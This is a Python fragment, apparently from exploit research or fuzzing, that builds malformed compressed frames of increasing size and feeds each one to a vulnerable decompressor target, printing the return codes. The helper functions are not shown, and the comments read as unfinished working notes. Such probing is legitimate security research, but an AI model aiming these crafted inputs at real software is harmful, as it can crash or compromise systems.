for target_kb in [1,2,4,8,16,32,64,100,120]:
    # sequences to fill ~target_kb: each seq ~2.25 bytes stream + produce output
    nseq = min(32000, max(1, int(target_kb*1024/2.25)))
    nlit = min(nseq, 2000)  # litLen=1 each, but cap literals at 2000 (output 2KB). Actually litLen=1* nseq needs nseq literals
    # To avoid litLen issues, give nseq literals (small) - but output 2KB limits. Use litLen=0? LL sym=0 -> litLen0.
    syms=[(0,0,0x7f)]*nseq   # LL sym=0 -> litLen 0, ML escape each
    st=build_stream(syms)
    # but we want dumps to advance: ML escape each seq. litLen=0 so no literal consumed.
    content = litraw(b'')+nb(nseq)+bytes([0,0])+st
    frame = b'\x00\x00\x00\x00'+b'\x25\xb5\x2f\xfd'+b'\x00'+bh(0,len(content))+content+b'\xC0\x00\x00'
    rc=run(frame)
    print("target=%dKB nseq=%d blockcontent=%d total=%d => vul rc=%d"%(target_kb,nseq,len(content),len(frame),rc))
